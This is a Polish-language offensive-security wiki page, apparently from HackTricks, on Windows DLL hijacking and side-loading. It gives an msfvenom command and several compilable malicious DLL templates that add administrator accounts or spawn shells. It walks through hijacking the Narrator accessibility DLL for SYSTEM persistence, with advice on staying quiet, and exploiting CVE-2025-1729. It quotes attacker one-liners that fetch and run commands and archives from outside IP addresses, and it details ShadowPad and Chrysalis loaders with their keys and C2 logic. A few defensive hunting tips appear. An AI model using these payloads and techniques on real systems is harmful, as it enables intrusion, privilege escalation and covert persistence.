**Utwórz użytkownika (x86, nie widziałem wersji x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Własny

W wielu przypadkach kompilowana biblioteka DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozpoznać, a exploit kończy się niepowodzeniem.

<details>
<summary>Szablon biblioteki DLL w C (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>Alternatywna DLL w C z punktem wejścia wątku</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

## Studium przypadku: Narrator OneCore TTS Localization DLL Hijack (Ułatwienia dostępu/ATs)

Narrator.exe w systemie Windows nadal podczas uruchamiania sprawdza przewidywalną, zależną od języka bibliotekę DLL lokalizacji, którą można przejąć, aby uzyskać możliwość wykonania dowolnego kodu i zapewnić trwałość.<sup>[[7]](#references)</sup>

Kluczowe informacje
- Ścieżka sprawdzana w obecnych kompilacjach: `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (w starszych kompilacjach): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli w ścieżce OneCore znajduje się zapisywalna biblioteka DLL kontrolowana przez atakującego, zostaje załadowana i wykonywane jest `DllMain(DLL_PROCESS_ATTACH)`. Eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i zaobserwuj próbę załadowania biblioteki DLL z powyższej ścieżki.

Minimalna biblioteka DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

Cisza OPSEC
- Naiwny hijack będzie mówić/podświetlać interfejs użytkownika. Aby działać po cichu, podczas attach wylicz wątki Narratora, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go przez `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Uruchamianie i trwałość za pomocą konfiguracji ułatwień dostępu
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Po wykonaniu powyższych czynności uruchomienie Narratora załaduje podrzuconą DLL. Na bezpiecznym pulpicie (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.

Wykonanie jako SYSTEM wyzwalane przez RDP (ruch lateralny)
- Włącz klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narratora; Twoja DLL wykona się jako SYSTEM na bezpiecznym pulpicie.
- Wykonywanie kończy się po zamknięciu sesji RDP — szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia ułatwień dostępu (AT), np. CursorIndicator, edytować go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Pozwala to uruchamiać dowolny kod za pośrednictwem frameworka ułatwień dostępu.

Uwagi
- Zapis w `%windir%\System32` i zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są potrzebne.

## Studium przypadku: CVE-2025-1729 - Eskalacja uprawnień z użyciem TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w aplikacji TrackPoint Quick Menu firmy Lenovo (`TPQMAssistant.exe`), śledzony jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajduje się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Zaplanowane zadanie**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia do katalogu**: Zapis jest dozwolony dla `CREATOR OWNER`, co pozwala użytkownikom lokalnym umieszczać dowolne pliki.
- **Zachowanie wyszukiwania DLL**: Program najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i zapisuje "NAME NOT FOUND", jeśli pliku brakuje, co wskazuje na pierwszeństwo wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić złośliwy plik-stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakujący DLL do wykonania kodu w kontekście użytkownika:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli w chwili wykonania zadania zalogowany jest administrator, złośliwy DLL uruchomi się w sesji administratora z poziomem integralności medium.
4. Wykorzystaj standardowe techniki UAC bypass, aby uzyskać uprawnienia SYSTEM, zaczynając od poziomu integralności medium.

## Studium przypadku: Dropper MSI CustomAction + DLL Side-Loading przez podpisany proces-host (wsc_proxy.exe)

Aktorzy zagrożeń często łączą droppery oparte na MSI z DLL side-loading, aby uruchamiać payloady w zaufanym, podpisanym procesie.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji z GUI (np. LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z osadzonych zasobów.
- Dropper zapisuje prawidłowy, podpisany EXE i złośliwy DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego EXE kolejność wyszukiwania DLL w Windows sprawia, że najpierw z katalogu roboczego ładowany jest wsc.dll, który wykonuje kod atakującego w procesie potomnym podpisanego pliku (ATT&CK T1574.001).

Analiza MSI (na co zwrócić uwagę)
- Tabela CustomAction:
  - Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication uruchamiający osadzony plik w tle.
  - W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Osadzone/podzielone payloady w pliku CAB MSI:
  - Wypakowanie administracyjne: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Możesz też użyć lessmsi: lessmsi x package.msi C:\out
  - Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction w VBScript. Typowy przebieg:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
  - wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować plik wsc.dll po nazwie z własnego katalogu.
  - wsc.dll: DLL atakującego. Jeśli nie są wymagane konkretne exports, wystarczy DllMain; w przeciwnym razie utwórz proxy DLL i przekieruj wymagane exports do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- W przypadku wymagań dotyczących eksportów użyj frameworka proxy (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, który jednocześnie uruchamia payload.

- Technika ta opiera się na rozpoznawaniu nazw DLL przez plik binarny hosta. Jeśli host używa ścieżek bezwzględnych lub bezpiecznych flag ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność wyszukiwania, dlatego należy je uwzględnić przy wyborze pliku binarnego hosta i zestawu eksportów.

## Signed triads + encrypted payloads (case study ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, aby upodobnić się do legalnego oprogramowania, a jednocześnie przechowywać główny payload na dysku w postaci zaszyfrowanej:<sup>[[12]](#references)</sup>

1. **Podpisany EXE hosta** – wykorzystywane są pliki od dostawców takich jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego tak, by przypominał plik binarny Windows (np. `conhost.exe`), ale podpis Authenticode pozostaje ważny.
2. **Złośliwa loader DLL** – umieszczana obok pliku EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle plikiem binarnym MFC zaciemnionym za pomocą frameworka ScatterBrain; jej jedynym zadaniem jest odnalezienie zaszyfrowanego bloba, odszyfrowanie go i wykonanie reflectively map ShadowPad.
3. **Zaszyfrowany blob payloadu** – często przechowywany w tym samym katalogu jako `<name>.tmp`. Po zmapowaniu odszyfrowanego payloadu do pamięci loader usuwa plik TMP, aby zniszczyć ślady kryminalistyczne.

Uwagi dotyczące tradecraft:

* Zmiana nazwy podpisanego pliku EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala podszyć się pod plik binarny Windows, zachowując jednocześnie podpis dostawcy. Dlatego naśladuj praktykę Ink Dragon polegającą na umieszczaniu plików wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ plik wykonywalny pozostaje zaufany, w większości przypadków mechanizmy allowlisting wymagają jedynie umieszczenia złośliwej DLL obok niego. Skup się na dostosowaniu loader DLL; podpisany plik nadrzędny zwykle może działać bez zmian.
* Deszyfrator ShadowPad oczekuje, że blob TMP będzie znajdował się obok loadera i będzie zapisywalny, aby można było wyzerować plik po mapowaniu. Pozostaw katalog z możliwością zapisu do czasu załadowania payloadu; gdy payload znajdzie się już w pamięci, plik TMP można bezpiecznie usunąć ze względów OPSEC.

### Łańcuch LOLBAS stager + sideloading archiwum etapowego (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, aby jedynym niestandardowym artefaktem na dysku była złośliwa DLL umieszczona obok zaufanego pliku EXE:<sup>[[1]](#references)</sup>

- **Zdalny loader poleceń (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera polecenia z serwera Finger i przekazuje je do `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, umożliwiając operatorom rotowanie drugiego etapu po stronie serwera.

- **Wbudowane pobieranie i rozpakowywanie:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i umieść cel sideloadingu oraz DLL w losowym folderze `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows narzędzia tar.

- **Uruchomienie WMI/CIM:** Uruchom EXE za pomocą WMI, aby telemetria pokazywała proces utworzony przez CIM podczas ładowania znajdującej się w tym samym katalogu biblioteki DLL:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Działa z plikami binarnymi, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Generuj alerty dla `forfiles`, gdy jednocześnie występują `/p`, `/m` i `/c`; poza skryptami administratorów jest to rzadkie.


## Studium przypadku: NSIS dropper + sideload Bitdefender Submission Wizard (Chrysalis)

Niedawna intruzja Lotus Blossom nadużyła zaufanego łańcucha aktualizacji, aby dostarczyć dropper spakowany za pomocą NSIS, który przygotowywał sideload DLL oraz payloady działające w całości w pamięci.<sup>[[13]](#references)</sup>

Przebieg działań
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, upuszcza przemianowany plik Bitdefender Submission Wizard `BluetoothService.exe`, złośliwy `log.dll` i zaszyfrowany blob `BluetoothService`, a następnie uruchamia plik EXE.
- Plik hosta EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` wczytuje blob za pomocą mmap; `LogWrite` odszyfrowuje go przy użyciu strumienia opartego na własnym LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor plaintextem shellcode, zwalnia zmienne tymczasowe i wykonuje skok do niego.
- Aby uniknąć IAT, loader rozwiązuje API, haszując nazwy exportów za pomocą **bazy FNV-1a 0x811C9DC5 + liczby pierwszej 0x1000193**, a następnie stosując avalanche w stylu Murmur (**0x85EBCA6B**) i porównując wynik z docelowymi hashami z solą.

Główny shellcode (Chrysalis)
- Odszyfrowuje główny moduł przypominający PE, wykonując przez pięć przebiegów operacje dodawania/XOR/odejmowania z kluczem `gQ2JR&9;`, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza nazwy DLL w czasie działania za pomocą transformacji rotacji bitów/XOR dla poszczególnych znaków, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę exportów w blokach 4-bajtowych z mieszaniem w stylu Murmur i używa `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Osadzona konfiguracja i C2
- Konfiguracja znajduje się w upuszczonym pliku `BluetoothService` pod **offsetem 0x30808** (rozmiar **0x980**) i jest odszyfrowywana za pomocą RC4 z kluczem `qwhvb^435h&*7`, ujawniając URL C2 i User-Agent.
- Beacony tworzą rozdzielany kropkami profil hosta, dodają z przodu tag `4Q`, a następnie szyfrują go RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane RC4 i obsługiwane przez przełącznik tagów (`4T` shell, `4V` uruchomienie procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` odinstalowanie, `4` wyliczanie dysków/plików + przypadki transferu porcjowanego).
- Tryb wykonania zależy od argumentów CLI: brak argumentów = instalacja persistence (service/Run key) wskazującego na `-i`; `-i` ponownie uruchamia samego siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- Ta sama intruzja upuściła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z plikiem `libtcc.dll` obok. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który został skompilowany i uruchomiony w pamięci, bez zapisywania pliku PE na dysku. Odtwórz za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten etap kompilacji i uruchomienia oparty na TCC importował w czasie działania `Wininet.dll` i pobierał shellcode drugiego etapu ze statycznie zakodowanego adresu URL, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Sideloading podpisanego hosta z proxyingiem eksportów + wstrzymaniem wątku hosta

Niektóre łańcuchy DLL sideloadingu wykorzystują **mechanizmy zwiększające stabilność**, aby legalny host działał wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Zaobserwowany schemat
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, której nadaj oczekiwaną nazwę zależności, np. `version.dll`.
- Złośliwa biblioteka DLL **proxy’uje każdy oczekiwany eksport** do prawdziwej systemowej biblioteki DLL (np. `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal się powiedzie, a proces hosta będzie działał.
- Po załadowaniu złośliwa biblioteka DLL **modyfikuje punkt wejścia hosta**, aby główny wątek trafiał do nieskończonej pętli `Sleep` zamiast kończyć działanie lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (często stosowane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ma znaczenie
- Standardowy proxying DLL zachowuje zgodność z API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo, by załadować kolejne etapy.
- Wstrzymanie głównego wątku za pomocą `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu, podczas gdy loader wykonuje deszyfrowanie, przygotowuje kolejne etapy lub inicjuje połączenie sieciowe w wątku roboczym.
- Analiza wyłącznie podejrzanego `DllMain` może nie wykryć tego schematu, jeśli interesujące działania następują po modyfikacji punktu wejścia hosta i uruchomieniu drugiego wątku.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, którą bibliotekę DLL ładuje z katalogu lokalnego.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z poziomu tego wątku zmodyfikuj punkt wejścia hosta lub procedurę startową głównego wątku tak, aby wykonywała pętlę `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` albo wykonaj manual mapping payloadu.

Wskazówki dla obrony
- Podpisane procesy ładujące `version.dll` lub podobne popularne biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Modyfikacje pamięci w punkcie wejścia procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki utworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej biblioteki DLL o odszyfrowanej nazwie.
- Proxy DLL z pełnym zestawem eksportów umieszczane obok plików wykonywalnych dostawców w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Analiza wywiadowcza: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – eskalacja uprawnień przy użyciu TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – aplikacja UWP TPQM Assistant](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL hijacking spotyka windowsowe narzędzia pomocnicze](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: analiza ewoluujących kampanii podszywania się, dystrybuujących Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza klastrów zagrożeń wymierzonych w rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: odkrywanie sieci przekaźników i kulis skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: szczegółowa analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno: łańcuch ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich irańskiego APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu z Iranem](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 wymierza działania w rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
